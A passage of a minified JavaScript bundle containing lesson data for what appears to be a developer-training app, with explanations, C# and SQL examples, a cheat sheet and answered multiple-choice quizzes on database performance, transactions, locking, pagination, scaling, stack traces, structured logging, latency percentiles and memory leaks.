pages","The index was rebuilt automatically after the first run finished","Logical reads are counted wrongly when the data comes from memory"],answer:1,why:"The first run loaded pages from disk (physical). The second run found them in memory. The query still needs 5,000 pages each time — that is the logical read count."},{id:"database.plan.3",kind:"scenario",difficulty:"hard",prompt:"A query is fast in your local test (10,000 rows) and slow in production (50 million rows). Before changing the code, what is the most useful thing to look at?",choices:["The production execution plan and its logical reads","The local execution plan, because the plan is the same at any size","The CPU and memory graphs of the API servers in production","The size of the JSON response that is sent back to the client"],answer:0,why:"With 10,000 rows almost any plan is fast. The production plan shows what really happens with real data sizes. Look for scans, big sorts and key lookups (extra trips to the table).",remember:"Small data hides bad plans."}]},{id:"database.n-plus-one",title:"The N+1 query problem",summary:"One query becomes a thousand.",minutes:3,blocks:[{type:"text",text:`**N+1** = 1 query to load a list, then 1 more query **for each item** in the list.
It often comes from **lazy loading**: the ORM loads related data only when your code first uses it.`},{type:"code",code:{lang:"csharp",text:`var orders = await db.Orders.ToListAsync();      // 1 query
foreach (var o in orders)
{
    // lazy loading → 1 query per order
    Console.WriteLine(o.Customer.Name);           // N queries
}`}},{type:"diagram",text:`10 orders     →    11 queries   (fine in dev)
1 000 orders  →  1 001 queries   (slow in prod)
Each query ~2 ms round trip → 2 seconds of waiting`},{type:"code",code:{lang:"csharp",text:`// Fix: load related data in one query
var orders = await db.Orders
    .Include(o => o.Customer)
    .ToListAsync();                               // 1 query (a JOIN)`}},{type:"text",text:"How to find it: the database log or profiler shows the **same query** many times in one request. Only the parameter value changes."}],remember:"Same query, different id, many times in one request → N+1.",questions:[{id:"database.n-plus-one.1",kind:"debug",difficulty:"easy",prompt:"One page load produces 501 SQL queries. 500 of them are `SELECT * FROM Customers WHERE Id = @p`. What is this?",choices:["A deadlock","An N+1 query problem","A missing primary key","A CORS error"],answer:1,why:"One query loaded a list, then the code ran one extra query per item. That is the typical N+1 pattern."},{id:"database.n-plus-one.2",kind:"compare",difficulty:"medium",prompt:"You must show 1,000 orders with customer names. Which is better?",choices:["Load orders, then loop and load each customer by id","Load orders and customers together with a JOIN / Include, or one query for all needed customer ids"],answer:1,why:"Two queries or one JOIN replace 1,001 round trips. Each query waits for the network, and the total wait grows fast.",remember:"Fetch related data in a batch, not in a loop."},{id:"database.n-plus-one.3",kind:"scenario",difficulty:"medium",prompt:"Why does N+1 often pass code review and testing?",choices:["Because the ORM merges the loop queries into one batch in tests","Because test data is small, so 11 queries feel instant","Because the database caches every result after the first query","Because the loop runs in parallel, so the extra queries are free"],answer:1,why:"With 10 rows you get 11 fast queries. The problem only appears when production has thousands of rows."}]},{id:"database.transactions",title:"Transactions and isolation",summary:"All or nothing — and what others can see.",minutes:4,blocks:[{type:"text",text:"A **transaction** groups several changes so they succeed or fail **together**.\n`COMMIT` saves all the changes. `ROLLBACK` undoes all of them."},{type:"code",code:{lang:"sql",text:`BEGIN TRANSACTION;
  UPDATE Accounts SET Balance = Balance - 100 WHERE Id = 1;
  UPDATE Accounts SET Balance = Balance + 100 WHERE Id = 2;
COMMIT;   -- both happen, or (on error / ROLLBACK) neither`}},{type:"text",text:'**Isolation** answers: "While my transaction runs, what can other transactions see and change?"'},{type:"diagram",text:`Level               Can read uncommitted data?   Blocking
READ UNCOMMITTED    yes ("dirty read")           least
READ COMMITTED      no  (SQL Server default)     some
REPEATABLE READ     no, and rows I read stay     more
SERIALIZABLE        no, like running one-by-one  most
SNAPSHOT            no, reads an old version     readers don't block writers`},{type:"text",text:"Higher isolation = fewer surprises, more waiting. Lower isolation = faster, but you may read data that is later rolled back (undone)."},{type:"text",text:"Keep transactions **short**. Never wait for a user, an email server or an HTTP call inside a transaction."}],remember:"Transaction = all or nothing. Keep it short.",questions:[{id:"database.transactions.1",kind:"scenario",difficulty:"easy",prompt:"You transfer money: subtract from account A, add to account B. The server crashes between the two updates. Without a transaction, what can happen?",choices:["Nothing, databases handle it","Money disappears from A but never arrives in B","Both updates are undone automatically","The money is added twice"],answer:1,why:"Without a transaction the first update is already saved when the crash happens. A transaction makes both updates succeed or fail together."},{id:"database.transactions.2",kind:"mcq",difficulty:"medium",prompt:"A report uses `WITH (NOLOCK)` (read uncommitted). What risk does that add?",choices:["The report can include changes that are later rolled back","The report locks the whole table and blocks all writers","The report cannot use a parallel plan, so it runs on one core","No real risk: it only skips waiting, the results are the same"],answer:0,why:'NOLOCK reads data that is not committed yet ("dirty reads"). It can also skip rows or count them twice while pages move.',remember:"NOLOCK = fast, but may be wrong."},{id:"database.transactions.3",kind:"code",difficulty:"hard",prompt:"What is the biggest problem in this code?",code:{lang:"csharp",text:`using var tx = await db.Database.BeginTransactionAsync();
order.Status = "Paid";
await db.SaveChangesAsync();
await paymentClient.ChargeAsync(order);   // HTTP call, 2–30 s
await tx.CommitAsync();`},choices:["SaveChangesAsync must be called again after the payment call","The transaction stays open (holding locks) during a slow HTTP call","Transactions do not work with async/await, so the commit is ignored","Status should be an enum, because a string can be saved with a typo"],answer:1,why:"The update takes locks and holds them until commit. A slow external call keeps those locks for seconds. Meanwhile, other requests that touch that order must wait.",remember:"No network calls inside a DB transaction."}]},{id:"database.locks",title:"Locks and deadlocks",summary:"Why queries wait for each other.",minutes:4,blocks:[{type:"text",text:"When a transaction changes a row, it takes a **lock**. Other transactions that need that row must **wait**. This is called **blocking**. Blocking is normal for a short time."},{type:"text",text:"A **deadlock** is when two transactions wait for each other forever."},{type:"diagram",text:`Tx 1: locks Order 1  ──── wants Order 2 ───┐
                                           ▼
Tx 2: locks Order 2  ──── wants Order 1 ───┘
        🔒 both wait → SQL Server kills one ("deadlock victim")`},{type:"list",items:["Access tables and rows in the **same order** everywhere.","Keep transactions **short**.","Add indexes so updates lock **fewer rows** (a scan may lock many).","Retry the victim transaction. Deadlocks can still happen sometimes."]}],remember:"Blocking = waiting. Deadlock = waiting for each other forever.",questions:[{id:"database.locks.1",kind:"mcq",difficulty:"easy",prompt:"What is a deadlock?",choices:["A query that runs so long that it hits the command timeout","Two transactions each waiting for a lock the other one holds","A table that stays locked because it has no indexes at all","A transaction that waits a few seconds for another to commit"],answer:1,why:"Each transaction waits for the other. The database detects the cycle and stops one of them."},{id:"database.locks.2",kind:"scenario",difficulty:"medium",prompt:"Endpoint A updates `Orders` then `Payments`. Endpoint B updates `Payments` then `Orders`. When traffic is high, you see deadlocks. What is the simplest design fix?",choices:["Use the same order in both: always `Orders` then `Payments`","Add more CPU to the database so transactions finish faster","Add `WITH (NOLOCK)` to both updates so they take no locks","Run the two endpoints on different API servers"],answer:0,why:'Deadlocks need a cycle. If everyone locks in the same order, nobody can hold the "second" lock while waiting for the "first".',remember:"Same lock order everywhere."},{id:"database.locks.3",kind:"debug",difficulty:"hard",prompt:"An `UPDATE Orders SET Status = 2 WHERE CustomerId = @id` causes a lot of blocking. There is no index on CustomerId. Why might an index reduce the blocking?",choices:["Indexes turn off row locking, so the update takes no locks at all","A scan reads and may lock many rows; a seek touches only matching rows","Indexes let the update commit in small batches automatically","It would not help: an UPDATE always locks the whole table anyway"],answer:1,why:"To find the rows, a scan reads (and can lock) far more rows than needed. A seek touches only the matching rows, so fewer locks and shorter waits."},{id:"database.locks.4",kind:"truefalse",difficulty:"medium",prompt:"If your design is good, you never need retry logic for deadlocks.",choices:["True","False"],answer:1,why:"Good design makes deadlocks rare, not impossible. Catch the deadlock error (1205 in SQL Server) and retry the whole transaction a few times."}]},{id:"database.pagination",title:"Pagination: OFFSET vs keyset",summary:"Why page 5,000 is slow.",minutes:3,blocks:[{type:"text",text:"Never return 1 million rows to a screen. Return a **page**."},{type:"code",code:{lang:"sql",text:`-- OFFSET: simple, but slow on deep pages
SELECT Id, Title FROM Posts
ORDER BY Id
OFFSET 100000 ROWS FETCH NEXT 20 ROWS ONLY;
-- the database still walks through 100 000 rows to skip them

-- Keyset ("seek"): remember the last id you showed
SELECT TOP 20 Id, Title FROM Posts
WHERE Id > @lastId
ORDER BY Id;
-- jumps straight to @lastId using the index`}},{type:"compare",left:{title:"OFFSET",items:['Easy "go to page 37"',"Gets slower as the page number grows","Rows can shift if data changes"]},right:{title:"Keyset",items:["Fast on any page",'Only "next / previous", no jump to page 37',"Needs a stable, indexed sort key"]}}],remember:"Deep pages → keyset pagination (WHERE Id > @lastId).",questions:[{id:"database.pagination.1",kind:"perf",difficulty:"medium",prompt:"Page 1 of an infinite scroll is fast. Page 4,000 takes 3 seconds. The query uses `OFFSET ... FETCH`. Why?",choices:["The browser keeps all 4,000 pages in memory and becomes slow","OFFSET must read and skip all earlier rows before returning the page","The database caches only the first pages, so later pages come from disk","Higher page numbers return bigger pages, so the network is slower"],answer:1,why:"To skip 80,000 rows the database still has to walk through them. The cost grows with the page number."},{id:"database.pagination.2",kind:"compare",difficulty:"medium",prompt:'A mobile feed only has "load more". Which approach fits better?',choices:["OFFSET / FETCH with a page number","Keyset pagination using the last seen id or timestamp"],answer:1,why:"A feed never jumps to page 37. Keyset pagination stays fast on any page. It also does not skip or repeat items when new posts arrive."},{id:"database.pagination.3",kind:"scenario",difficulty:"easy",prompt:"An API endpoint `GET /orders` returns all 2 million orders as JSON. What is the best first fix?",choices:["Compress the JSON response with gzip","Add pagination with a maximum page size","Move the endpoint to a bigger, faster server","Increase the API timeout so the request can finish"],answer:1,why:"No client needs 2 million rows at once. A page size limit protects the database, the network and the client.",remember:"Every list endpoint needs a page size limit."}]},{id:"database.scaling",title:"Scaling a database",summary:'What to try before "we need a new database".',minutes:4,blocks:[{type:"text",text:"When the database is the **bottleneck** (the part that slows everything down), go in this order. Each step is cheaper than the next."},{type:"diagram",text:`1. Fix the query     → indexes, N+1, SELECT only needed columns
2. Cache             → don't ask the DB the same thing 1 000×/sec
3. Scale up          → bigger server (more RAM, faster disk)
4. Read replicas     → reads go to copies, writes to the primary
5. Partition / shard → split data across tables or servers
                         (hardest — changes your whole app)`},{type:"example",title:"Read replica trap",text:"A **read replica** is a read-only copy of the primary database. Replicas are a little behind the primary (**replication lag**). A user saves their profile. The next page reads from a replica and shows the old name. So you must decide which reads need fresh data."}],remember:"Fix queries first. Sharding is the last step, not the first.",questions:[{id:"database.scaling.1",kind:"scenario",difficulty:"medium",prompt:"The database CPU is at 90%. One query runs 2,000 times per second and does a full scan. A teammate suggests sharding the database. What do you suggest first?",choices:["Agree, and start sharding the database by customer id","Fix that query (index, maybe cache the result) and measure again","Move the data to a NoSQL database, which scales better","Add more API servers to spread the 2,000 calls per second"],answer:1,why:"One busy query that scans is cheap to fix. Sharding (splitting data across servers) is a huge, risky change. Fix and measure first.",remember:"Measure → fix the biggest query → measure again."},{id:"database.scaling.2",kind:"debug",difficulty:"hard",prompt:'After adding a read replica, users say: "I changed my address, but the page still shows the old one. After a refresh it is correct." What is the most likely cause?',choices:["The browser cached the old page and showed it again","Replication lag: the read went to a replica without the change yet","The update was rolled back first and then retried later","The index on the address column is corrupted on the replica"],answer:1,why:"Replicas apply changes slightly later. Reads right after a write should go to the primary (read-your-own-writes)."},{id:"database.scaling.3",kind:"mcq",difficulty:"easy",prompt:"What does a read replica help with?",choices:["Faster writes, because writes are split across the copies","Spreading read traffic across more servers","Smaller tables, because each replica holds part of the data","Removing the need for indexes on large tables"],answer:1,why:"All writes still go to the primary. Replicas take some of the read work away from it."}]}],cheatSheet:[{title:"Structure",items:[{term:"PRIMARY KEY",meaning:"Unique id of a row"},{term:"FOREIGN KEY",meaning:"Value must exist in another table — prevents orphan rows"},{term:"INDEX",meaning:"Sorted copy of some columns → find rows faster"},{term:"INCLUDE columns",meaning:"Extra columns kept in the index, so the query does not need to read the table"}]},{title:"Reading a plan",items:[{term:"INDEX SEEK",meaning:"Jump to specific matching entries ✅"},{term:"INDEX / TABLE SCAN",meaning:"Read many or all entries ⚠️ on big tables"},{term:"LOGICAL READS",meaning:'8 KB pages read from memory — "how much data did I touch?"'},{term:"PHYSICAL READS",meaning:"Pages read from disk — drop to 0 when cached"},{term:"HIGH LOGICAL READS",meaning:"Often the query reads too much data"},{term:"f(Column) in WHERE",meaning:"Usually blocks a seek — compare the raw column instead"}]},{title:"Concurrency",items:[{term:"TRANSACTION",meaning:"All changes succeed or none do"},{term:"BLOCKING",meaning:"One transaction waits for another’s lock"},{term:"DEADLOCK",meaning:"Two transactions wait for each other → one is killed"},{term:"NOLOCK",meaning:"Dirty reads — fast but may be wrong"},{term:"Rule",meaning:"Short transactions, same lock order, no HTTP calls inside"}]},{title:"Common problems",items:[{term:"N+1",meaning:"One query + one more per item → batch / JOIN / Include"},{term:"OFFSET deep pages",meaning:"Slow → use keyset: WHERE Id > @lastId"},{term:"SELECT *",meaning:"Reads columns you do not need; an index can rarely cover (hold) them all"},{term:"Replication lag",meaning:"Replica shows old data right after a write"}]}]},S=Object.freeze(Object.defineProperty({__proto__:null,default:A},Symbol.toStringTag,{value:"Module"})),C={id:"debugging",title:"Debugging",emoji:"🐛",tagline:"Don't guess. Find evidence.",lessons:[{id:"debugging.method",title:"Don't guess. Find evidence.",summary:"A simple loop that finds bugs faster than guessing.",minutes:4,blocks:[{type:"text",text:`Most debugging time is lost by **guessing**.
"Maybe it is the cache?" → change something → deploy → still broken → guess again.
A better way: follow the evidence.`},{type:"diagram",text:`Bug
 ↓
Reproduce         can I make it happen on purpose?
 ↓
Collect evidence  logs, metrics, traces, data
 ↓
Find clues        what is different when it fails?
 ↓
Form hypothesis   "X causes it, because Y"
 ↓
Test              prove the idea right or wrong
 ↓
Fix
 ↓
Verify            bug gone? nothing else broken?`},{type:"list",items:["**When** did it start? What changed then: a deploy, a config value, the data, the traffic?","**Who** is affected? Everyone, or only some users, countries, browsers, big accounts?",'**How often?** Always, or only sometimes? "Sometimes" often means timing, load or specific data.']},{type:"text",text:'A **hypothesis** is your best idea about the cause, before you have proof. A good hypothesis is **specific** and can be proven wrong.\n❌ "Something is weird with the server."\n✅ "Orders with an expired discount code fail, because `DiscountService` returns null for them."'},{type:"text",text:"Change **one thing at a time**. Imagine you change three things and the bug disappears. Now you do not know which change fixed it. Maybe one of them only hid it."},{type:"example",title:"The fix that was not a fix",text:"An API had many database timeouts. Someone raised the timeout from 30 s to 120 s. The errors disappeared from the dashboard. The real cause was a missing index after a migration. Users now simply waited longer."}],remember:"Don't guess. Find evidence. Change one thing at a time.",questions:[{id:"debugging.method.1",kind:"scenario",difficulty:"easy",prompt:'A user reports "checkout is broken". It works fine on your machine. What is the best next step?',choices:["Add more null checks and try/catch blocks around the checkout code",'Close the ticket as "cannot reproduce", since it works on your machine',"Get the time, user and error, then find their request in the logs","Restart the production servers to clear any bad state, then wait"],answer:2,why:"You need evidence from the failing case, not from your machine. Time and user id let you find the exact request in the logs.",remember:"Start from the failing case, not from your laptop."},{id:"debugging.method.2",kind:"mcq",difficulty:"medium",prompt:"Which of these is a **useful** hypothesis?",choices:['"Something in the backend acts weird since the last release"','"It is probably a random network problem between services"','"The database is slow in general, so things break sometimes"','"Expired discount codes make DiscountService return null"'],answer:3,why:"A useful hypothesis names a specific cause you can test. You can try an expired code and see if it fails. The others are too vague to prove right or wrong."},{id:"debugging.method.3",kind:"scenario",difficulty:"easy",prompt:"Errors started on Tuesday at 14:00. Before that, everything was fine for weeks. What is the most useful first question?",choices:["What changed around Tuesday 14:00: deploy, config, data or traffic?","Which programming language is the service written in?","How many unit tests does the project have?","Who wrote the original code five years ago?"],answer:0,why:"Code that worked for weeks does not break by itself. Something changed at that moment. Find the change and you often find the cause.",remember:"New bug at a clear time → look for what changed at that time."},{id:"debugging.method.4",kind:"scenario",difficulty:"medium",prompt:"To fix a bug you upgrade a library, add an index and change a timeout, all in one deploy. The bug is gone. What is the problem?",choices:["Nothing, the bug is fixed and that is all that matters","You do not know which change fixed it, or if one only hid it","Indexes cannot be added in the same deploy as code changes","The library upgrade will undo the index automatically"],answer:1,why:"With three changes at once you learn nothing about the cause. If the bug comes back, or one change causes a new problem, you start from zero."},{id:"debugging.method.5",kind:"scenario",difficulty:"hard",prompt:"An API has many SQL timeouts. A teammate raises the command timeout from 30 s to 120 s and the timeout errors stop. What is wrong with this fix?",choices:["SQL Server does not allow timeouts above 60 seconds","Longer timeouts make SQL Server choose worse plans","It hides the symptom: the query is still slow and users wait longer","Nothing is wrong, fewer errors means the problem is solved"],answer:2,why:"The timeout was the alarm, not the problem. The slow query is still there. Find why it is slow (query plan, index, locks) instead of turning off the alarm.",remember:"Do not silence the alarm. Find what triggered it."}]},{id:"debugging.stack-traces",title:"Reading stack traces",summary:"Where the error really is, and where to start looking.",minutes:4,blocks:[{type:"text",text:"A **stack trace** is the path the code took to reach the error.\nIn .NET the first line is the exception **type** and **message**. Then come the `at` lines. Each `at` line is one **frame**: one method call. The **top frame** is where the exception was thrown. Each line below is the caller of the line above."},{type:"code",code:{lang:"text",text:`System.NullReferenceException: Object reference
  not set to an instance of an object.
   at Shop.Pricing.ShippingCalculator.Calculate(Order o)
      in ShippingCalculator.cs:line 42       ← thrown here
   at Shop.Orders.CheckoutService.PlaceOrder(Cart c)
      in CheckoutService.cs:line 88          ← called it
   at Shop.Api.OrdersController.Post(CartDto dto)
   at Microsoft.AspNetCore.Mvc...            ← framework`}},{type:"list",items:["1. Read the exception **type** and **message**.","2. Find the **first frame from your own code**. Skip framework and library frames — they are rarely the bug.","3. Open that file and line.","4. Ask: which value here could be null, empty or wrong?"]},{type:"text",text:"**Inner exceptions.** The real cause is often wrapped inside another exception.\n`DbUpdateException: An error occurred while saving the entity changes. See the inner exception for details.`\n  ---> `SqlException: Cannot insert duplicate key in object dbo.Users.`\nAlways read the whole chain. The **innermost** one (the last in the chain) usually shows the real cause."},{type:"code",code:{lang:"csharp",text:`catch (Exception ex)
{
    _log.LogError(ex, "Payment failed");  // pass ex!
    throw;       // ✅ keeps the original stack trace
    // throw ex; // ❌ resets the trace to this line
}`}}],remember:"Message first, then the first frame in YOUR code, then the inner exception.",questions:[{id:"debugging.stack-traces.1",kind:"code",difficulty:"medium",prompt:"Where should you look first?",code:{lang:"text",text:`System.InvalidOperationException:
  Sequence contains no elements
   at System.Linq.ThrowHelper.ThrowNoElementsException()
   at System.Linq.Enumerable.First[TSource](...)
   at Shop.Invoices.InvoiceService.GetMainLine(Order o)
      in InvoiceService.cs:line 31
   at Shop.Invoices.InvoiceService.Build(Order o)
      in InvoiceService.cs:line 12`},choices:["Inside System.Linq — it probably has a bug","InvoiceService.cs line 12, where Build starts","The controller that started the request","InvoiceService.cs line 31, where your code calls First()"],answer:3,why:"LINQ threw because it was asked for the first item of an empty list. The first frame in your code (line 31) is where that call happens. Ask why the order has no lines there.",remember:"Skip framework frames. Start at the first frame in your code."},{id:"debugging.stack-traces.2",kind:"debug",difficulty:"medium",prompt:"The log only says: `DbUpdateException: An error occurred while saving the entity changes. See the inner exception for details.` What is the most useful next step?",choices:["Read or log the inner exception — it has the real database error","Increase the database command timeout, because the save took too long","Wrap SaveChanges in a retry loop, because the error is likely temporary","Call SaveChanges a second time to check that the same error comes back"],answer:0,why:'The outer exception only says "saving failed". The inner exception says why. For example: a duplicate key, a NULL in a required column, or a foreign key error.'},{id:"debugging.stack-traces.3",kind:"code",difficulty:"hard",prompt:"This code runs when a payment fails. What useful information is lost?",code:{lang:"csharp",text:`try
{
    await _payments.ChargeAsync(order);
}
catch (Exception ex)
{
    _log.LogWarning("Charge failed");
    throw ex;
}`},choices:["Nothing, because the exception is still rethrown","Only the message text of the exception","The original stack trace, and the error details in the log","The order object, because async code loses it"],answer:2,why:"`throw ex;` resets the stack trace so it seems to start in this catch block. And the log call does not pass `ex`, so the log has no exception details. Use `_log.LogWarning(ex, ...)` and `throw;`.",remember:"Use `throw;` not `throw ex;`. Always pass the exception to the logger."},{id:"debugging.stack-traces.4",kind:"truefalse",difficulty:"easy",prompt:"In a .NET stack trace, the top `at` line shows where the request started (for example, the controller).",choices:["True","False"],answer:1,why:"The top frame is where the exception was thrown — the deepest call. The place where the request started (like the controller) is further down."}]},{id:"debugging.logs",title:"Logs that actually help",summary:"Structured logs, correlation ids, and the empty catch block.",minutes:4,blocks:[{type:"text",text:"A good log line answers: **what** happened, to **which** thing (order id, user id), **when**, and **how long** it took."},{type:"compare",left:{title:"Plain text log",items:['`"Order 512 failed for user 9"`',"Search with text matching only","Hard to count or graph"]},right:{title:"Structured log",items:["`{ OrderId: 512, UserId: 9 }` as fields","Filter: `OrderId = 512`","Easy: failures per hour"]}},{type:"code",code:{lang:"csharp",text:`// ❌ interpolation: values become part of the text
_log.LogInformation($"Order {order.Id} paid in {ms} ms");

// ✅ message template: OrderId and Ms become fields
_log.LogInformation("Order {OrderId} paid in {Ms} ms",
    order.Id, ms);`}},{type:"text",text:"A **correlation id** is one id per request. It is passed to every service and written on every log line. With it, you filter one user's request across five services. Without it, you match timestamps by hand."},{type:"diagram",text:`Browser ─► API ─► Orders ─► Payments
     CorrelationId = 7f3a  (on every log line)

Search: CorrelationId = 7f3a
 → 12 lines, 3 services, one clear story`},{type:"text",text:"The worst log is **no log**. Code that catches an exception and ignores it **swallows** the error. Nobody ever sees it:"},{type:"code",code:{lang:"csharp",text:`try { await SendInvoiceEmail(order); }
catch { }   // ❌ it failed. Nobody will ever know.

// ✅ if you really want to continue, at least log it
catch (Exception ex)
{
    _log.LogError(ex, "Invoice email failed for {OrderId}",
        order.Id);
}`}}],remember:"Log with ids and structure. Never catch and ignore.",questions:[{id:"debugging.logs.1",kind:"debug",difficulty:"medium",prompt:"Customers say invoices sometimes never arrive. The logs show **no errors** at all. You find this code. Why are there no errors in the logs?",code:{lang:"csharp",text:`try
{
    await _email.SendAsync(invoice);
}
catch
{
}`},choices:["The email server never fails, so the bug is elsewhere","Async methods cannot throw exceptions","The log level is set too high to show errors","The exception is caught and ignored, so nothing is logged"],answer:3,why:'An empty catch block catches the error and ignores it. The send fails, the code continues, and no log line is written. "No errors in the logs" does not mean "no errors".',remember:"Empty catch = invisible bug."},{id:"debugging.logs.2",kind:"scenario",difficulty:"medium",prompt:"A request goes through Gateway → Orders → Payments → Notifications. One user's order failed at 10:42. Thousands of requests ran at that minute. What makes it easy to find all related log lines?",choices:["Turning on Debug logging in every service so no detail is missed","A correlation id written on every log line in every service","Keeping log files longer and searching all of them for 10:42","Syncing all server clocks so lines can be matched by exact time"],answer:1,why:"One shared id lets you filter exactly the lines of this request in every service. More logs or better clocks still leave you guessing which lines belong together."},{id:"debugging.logs.3",kind:"code",difficulty:"medium",prompt:"Which log call lets you later filter logs by the field `OrderId = 512`?",code:{lang:"csharp",text:`// A
_log.LogInformation($"Order {id} shipped");
// B
_log.LogInformation("Order {OrderId} shipped", id);`},choices:["A","B","Both, they produce the same log","Neither"],answer:1,why:"B uses a message template, so the logger stores `OrderId` as a separate field. A builds a finished string first, so the logger only sees text.",remember:'Message template, not `$"..."`, in log calls.'},{id:"debugging.logs.4",kind:"scenario",difficulty:"hard",prompt:"You need more detail for one bug in production. Turning on Debug logs for all services would create 50 GB per hour. What is the better approach?",choices:["Turn on Debug everywhere and leave it on, just in case","Remove all logging to save money, then add it back later","Raise the level only for the one component, for a short time","Copy the full production database to your laptop"],answer:2,why:"Most logging libraries let you change the level per category or namespace at runtime. Raise it only where the bug is and collect evidence. Then lower it again."}]},{id:"debugging.latency",title:"Metrics and latency: averages lie",summary:"p50, p95, p99 — and why the slow tail matters.",minutes:4,blocks:[{type:"text",text:`**Logs** tell you what happened to one request.
**Metrics** tell you how much and how often, across all requests: requests per second, error rate, latency, CPU, memory.`},{type:"text",text:`**Latency** is how long one request takes. **Latency percentiles**:
**p50** (median): half of the requests are faster than this.
**p95**: 95% are faster, the slowest 5% are slower.
**p99**: only the slowest 1% are slower.`},{type:"diagram",text:`100 requests:
  95 × 100 ms
   5 × 4 000 ms

Average ≈ 295 ms     "looks OK"
p50     =  100 ms    "looks great"
p99     = 4 000 ms   "5 users waited 4 seconds!"`},{type:"text",text:"The **slow tail** is the small group of the slowest requests. It matters more than it looks. One page may call 10 backend services. If each is slow 1% of the time, about **1 in 10 pages** hits at least one slow call. And your biggest customers (large carts, many orders) are often the ones in the tail."},{type:"list",items:["**Traffic** — requests per second.","**Errors** — how many fail.","**Latency** — p50 / p95 / p99.","**Saturation** — how full things are: CPU, memory, connection pool, queue length."]},{type:"example",title:"Reading a graph",text:"p99 latency jumped at 10:05, exactly when deploy 1.42 finished. That is not proof, but it is a strong clue about where to look first."}],remember:"Watch p95/p99, not just the average. The tail is where users suffer.",questions:[{id:"debugging.latency.1",kind:"perf",difficulty:"medium",prompt:'The dashboard shows average latency 120 ms, stable all week. Support gets many complaints: "the page is sometimes very slow". What do you check?',choices:["Nothing: a stable 120 ms average means users are fine","The CSS bundle size, because a big bundle makes every page slow","p95/p99 latency, because the average can hide a slow tail","How many commits were pushed today, to spot risky changes"],answer:2,why:"When most requests are fast, a few very slow ones change the average only a little. Percentiles show the slow tail that users complain about."},{id:"debugging.latency.2",kind:"mcq",difficulty:"easy",prompt:"An endpoint has **p99 latency = 800 ms**. What does that mean?",choices:["99% of requests take 800 ms or less; 1% take longer","99% of requests take exactly 800 ms","The average request takes 800 ms","Only 1% of requests are faster than 800 ms"],answer:0,why:"p99 is the value that 99% of requests stay under. It describes the slow end, not the typical request."},{id:"debugging.latency.3",kind:"debug",difficulty:"hard",prompt:"After a deploy, p50 latency is unchanged (90 ms), but p99 went from 300 ms to 6 s. The error rate is flat. Which cause fits best?",choices:["Every request got 5 ms slower from one extra log line","A new slow path that only some requests hit, like large accounts","The whole service is down for everyone","The CDN is serving old images to users"],answer:1,why:"The typical request is still fast, so the change hurts only a small group. A code path for big data fits that pattern. For example, N+1 queries on large accounts.",remember:"p50 fine + p99 bad → a slow path for some requests."},{id:"debugging.latency.4",kind:"debug",difficulty:"medium",prompt:'Logs show: "Timeout expired. The timeout period elapsed prior to obtaining a connection from the pool." App CPU is 15%. What does this point to?',choices:["The servers need more CPU to open new database connections faster","Traffic is too low, so idle connections close and must be reopened","The log files grew too large and now slow down every request","Connections are held too long or never returned (slow queries, leaks)"],answer:3,why:"The connection pool is full (saturation). Either queries hold connections for a long time, or code forgets to dispose connections. More CPU does not help."}]},{id:"debugging.resources",title:"CPU, memory and IO",summary:"Is the app computing, waiting, or busy with memory?",minutes:5,blocks:[{type:"text",text:`When an app is slow, it is usually doing one of three things:
**computing** (CPU), **waiting** (IO: database, disk, network) or **busy with memory** (garbage collection, swapping).`},{type:"diagram",text:`Symptom                    First suspect
High CPU, slow             hot loop, heavy JSON, regex
Low CPU, slow              waiting: DB, HTTP, locks
Low CPU, slow, threads ↑   blocked threads (.Result)
Memory low point rises     leak: something keeps refs
Memory saw-tooth, stable   normal GC, probably fine`},{type:"text",text:'**Memory leaks in .NET.** The garbage collector (GC) frees objects that nobody references. So in .NET, a "leak" usually means **something still holds a reference**. For example: a static list, a cache with no size limit, or an event handler that is never removed.'},{type:"code",code:{lang:"csharp",text:`public static class ReportCache
{
    // ❌ grows forever: nothing is ever removed
    public static readonly Dictionary<string, byte[]> Items
        = new();
}`}},{type:"compare",left:{title:"Healthy memory ✅",items:["Goes up and down (saw-tooth)","Low point after GC stays about the same","Stable over days"]},right:{title:"Leak ⚠️",items:["Low point after each GC keeps rising",'A restart "fixes" it for a while',"Ends with OutOfMemory or the container killed"]}},{type:"text",text:"**IO wait**: CPU is low, but requests are slow. The app is waiting for something else. Measure the time of each external call (DB, HTTP, disk). A **trace** (a timeline of one request) shows this directly."},{type:"text",text:"**Thread pool starvation** (.NET) means no free threads are left. Code blocks a thread with `.Result` or `.Wait()` on async work. Under load, all threads are stuck waiting, and new requests wait in a queue. CPU is low, latency is huge. Fix: use `await` at every level, from the controller to the lowest call."}],remember:"High CPU = computing. Low CPU + slow = waiting. Rising memory low point = leak.",questions:[{id:"debugging.resources.1",kind:"debug",difficulty:"medium",prompt:"Memory goes up during the day and drops after each GC. But the lowest point after GC is higher every hour. Every night the container is killed for using too much memory. Most likely cause?",choices:["Normal GC behaviour: memory always grows during busy hours of the day","The CPU is too slow, so the GC cannot run often enough to keep up","A leak: something keeps references, like a static cache with no limit","The memory limit is too low; raising it will fix the problem for good"],answer:2,why:"If the low point after GC keeps rising, the GC cannot free those objects, because something still references them. Take two memory dumps (snapshots of memory) a few hours apart. Then compare what grew.",remember:"Watch the low point after GC, not the peaks."},{id:"debugging.resources.2",kind:"debug",difficulty:"hard",prompt:"Under load, latency grows to 30 s. CPU is 10%, the database is fine, and the number of threads keeps growing. You find this in a controller. What is the most likely cause?",code:{lang:"csharp",text:`public IActionResult Get(int id)
{
    var user = _client.GetUserAsync(id).Result;
    return Ok(user);
}`},choices:["Thread pool starvation: threads are blocked waiting on .Result","The database is overloaded, so every query waits a long time for locks","The JSON serializer is too slow when it writes large user objects","The garbage collector runs too often and pauses all the threads"],answer:0,why:"`.Result` blocks a thread while the HTTP call runs. Under load every thread is blocked, so new requests wait for a free thread. Make the action `async` and `await` the call.",remember:"Low CPU + growing threads + slow → look for `.Result` / `.Wait()`."},{id:"debugging.resources.3",kind:"perf",difficulty:"medium",prompt:"After a release, CPU is at 95% on all API servers and requests are slow. What is the best first step?",choices:["Add more memory to the servers so the GC runs less often","Increase the HTTP timeout so slow requests can still finish","Turn off all logging, because writing logs uses a lot of CPU","Profile the CPU (for example `dotnet-trace`) to see which code uses it"],answer:3,why:"A profile shows which methods use the most CPU. Compare it with the code changes in the release. You usually find the cause quickly. The other options do not touch the CPU problem."},{id:"debugging.resources.4",kind:"mcq",difficulty:"easy",prompt:"Memory goes from 300 MB to 800 MB, then GC brings it back to 300 MB. This repeats every few minutes, for weeks. Is it a leak?",choices:["Yes, because memory in a healthy app should never go up this much","Probably not: the low point stays at 300 MB, so GC works normally","Yes, because the GC has to run every few minutes to free memory","Yes, because a .NET web app should always stay under 500 